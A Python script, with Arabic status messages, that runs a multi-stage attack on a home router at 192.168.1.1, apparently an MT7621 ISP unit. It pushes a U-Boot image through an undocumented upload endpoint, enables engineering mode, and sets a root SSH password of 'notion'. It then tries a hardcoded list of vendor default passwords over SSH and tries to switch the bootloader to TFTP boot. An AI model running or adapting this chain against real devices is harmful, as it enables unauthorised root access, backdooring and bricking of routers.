#!/usr/bin/env python3
import sys
import os
import time
import socket
import http.client
import subprocess

ROUTER_IP = "192.168.1.1"
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import api_login
import api_ssh

def wait_for_http(timeout=3600):
    print(f"⏳ بانتظار اتصال الراوتر وحصول استجابة على HTTP ({ROUTER_IP}:80)...")
    start = time.time()
    while time.time() - start < timeout:
        try:
            s = socket.socket()
            s.settimeout(2)
            s.connect((ROUTER_IP, 80))
            s.close()
            print("✅ تم الاتصال بالراوتر بنجاح على المنفذ 80!")
            return True
        except Exception:
            time.sleep(2)
    return False

def step1_upload_bootloader():
    print("\n==========================================")
    print("📌 [مرحلة 1] محاولة رفع bootloader بأكثر من طريقة")
    print("==========================================")
    if not api_login.login():
        print("❌ فشل تسجيل الدخول إلى الراوتر")
        return False

    uboot_path = "openwrt-ramips-mt7621-sxx-u-boot.img"
    if not os.path.exists(uboot_path):
        print(f"❌ الملف {uboot_path} غير موجود")
        return False

    with open(uboot_path, "rb") as f:
        data = f.read()

    headers = {
        "Cookie": f"CGISID={api_login.CGISID}",
        "Content-Type": "application/octet-stream"
    }

    file_types = ["bootloader", "uboot", "u-boot", "boot", "bl", "upgrade", "cp_upgrade"]
    for ft in file_types:
        url = f"/xml_action.cgi?Action=Upload&file={ft}&command="
        try:
            conn = http.client.HTTPConnection(ROUTER_IP, timeout=15)
            conn.request("POST", url, body=data, headers=headers)
            r = conn.getresponse()
            resp = r.read().decode("latin-1")
            print(f"  - رفع RAW كـ {ft:12s} -> HTTP {r.status} | الرد: {resp[:100].strip()}")
            conn.close()
        except Exception as e:
            print(f"  - رفع RAW كـ {ft:12s} -> خطأ: {e}")
    return True

def step2_plan_a_and_b():
    print("\n==========================================")
    print("📌 [مرحلة 2] تنفيذ الخطط A + B (eng_mode + dropbear_info)")
    print("==========================================")
    api_login.login()

    print("[A] تفعيل Engineering Mode (mode=2)...")
    r1 = api_ssh.enable_eng_mode("2")
    print(f"    النتيجة: {r1}")

    print("[B] ضبط set_dropbear_info (user=root, pass=notion)...")
    r2 = api_ssh.set_dropbear_info(user="root", password="notion", mode="1", key_type="99")
    print(f"    النتيجة: {r2}")

    print("🔄 إعادة تشغيل الراوتر الآن لتطبيق التغييرات...")
    api_ssh.reboot()
    
    print("⏳ انتظار 90 ثانية لإتمام إعادة التشغيل...")
    time.sleep(90)
    wait_for_http(120)

def step3_ssh_bruteforce():
    print("\n==========================================")
    print("📌 [مرحلة 3] تجربة الاتصال عبر SSH بكلمات سر متعددة")
    print("==========================================")
    passwords = [
        "notion", "root", "admin", "password", "12345678", "Om@0Yt#5",
        "Om@5Wr%8", "ooredoo", "Ooredoo", "", "1234", "user", "guest", "test",
        "CmXmc@2o22", "Beyless", "Superlightweight123", "highwmg", "Highwmg",
        "mtk7621", "MTK7621", "Zte521", "passworld143", "$Passworld143"
    ]

    for pw in passwords:
        res = api_ssh.ssh_connect(pw, timeout=4)
        if res.get("success"):
            print(f"\n🎉🎉🎉 نجاح SSH! كلمة السر هي: '{pw}'")
            return pw
        else:
            print(f"  - SSH root@192.168.1.1 (pass: '{pw}') -> {res.get('note')}")
    return None

def step4_plan_c_fw_setenv():
    print("\n==========================================")
    print("📌 [مرحلة 4] محاولة تفعيل TFTP boot عبر API (fw_setenv)")
    print("==========================================")
    api_login.login()

    methods = [
        ("system", "fw_setenv", "<name>bootcmd</name><value>tftp</value>"),
        ("system", "setenv", "<name>bootcmd</name><value>tftp</value>"),
        ("bootloader", "setenv", "<name>bootcmd</name><value>tftp</value>"),
        ("env", "set", "<name>bootcmd</name><value>tftp</value>"),
        ("uboot", "setenv", "<name>bootcmd</name><value>tftp</value>"),
        ("router", "setenv", "<name>bootcmd</name><value>tftp</value>"),
    ]

    for obj, method, xml_payload in methods:
        xml = (f'<?xml version="1.0" encoding="US-ASCII"?>'
               f'<RGW><param><method>call</method><session>000</session>'
               f'<obj_path>{obj}</obj_path><obj_method>{method}</obj_method>'
               f'</param>{xml_payload}</RGW>')
        resp = api_login.api(xml)
        print(f"  - {obj}/{method:12s} -> {resp[:120].strip() if resp else '(لا رد)'}")

def main():
    if not wait_for_http():
        print("❌ انتهت المهلة دون الاتصال بالراوتر.")
        return

    step1_upload_bootloader()
    step2_plan_a_and_b()
    found_pw = step3_ssh_bruteforce()
    if found_pw:
        print("\n✅ تم اختراق SSH بنجاح! جاهز لتفليش firmware_telnetd.bin")
        return

    step4_plan_c_fw_setenv()

if __name__ == "__main__":
    main()
